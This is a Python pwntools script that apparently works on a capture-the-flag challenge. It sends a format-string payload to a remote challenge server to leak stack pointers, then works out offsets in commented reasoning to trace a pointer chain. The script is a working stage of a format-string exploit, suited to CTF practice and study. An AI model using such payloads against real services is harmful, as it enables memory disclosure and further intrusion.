from pwn import *

# Set context
context.arch = 'amd64'

def find_chain():
    r = remote('chals.cyberjousting.com', 1367)
    payload = b'byuctf{welcome_to_rev_fellas}|%1$p|%34$p|%37$p'
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'Correct! The flag is ')
    data = r.recvline().decode().strip()
    leaks = data.split('|')[1:]
    r.close()
    
    i1 = int(leaks[0], 16)
    i34 = int(leaks[1], 16)
    i37 = int(leaks[2], 16)
    
    print(f"Index 1: {hex(i1)}")
    print(f"Index 34: {hex(i34)}")
    print(f"Index 37: {hex(i37)}")
    
    # Distance between Index 1 and Index 34 is (34-1)*8 = 264
    addr_i34 = i1 + 264 # If i1 points to the address of Index 1
    # Wait, i1 IS the address of Index 1?
    # rsi usually points to [rbp-0x70].
    # [rbp-0x70] is Index 20.
    # So Addr(Index 20) = i1.
    # Then Addr(Index 34) = i1 + (34-20)*8 = i1 + 112.
    
    addr_i34 = i1 + 112
    print(f"Calculated Addr(Index 34): {hex(addr_i34)}")
    print(f"Value at Index 34: {hex(i34)}")
    if i34 == addr_i34 + 88:
        print("Index 34 points to Index 45")
    else:
        dist = i34 - addr_i34
        print(f"Index 34 points to offset {dist} from Addr(Index 34), which is Index {34 + dist//8}")

find_chain()
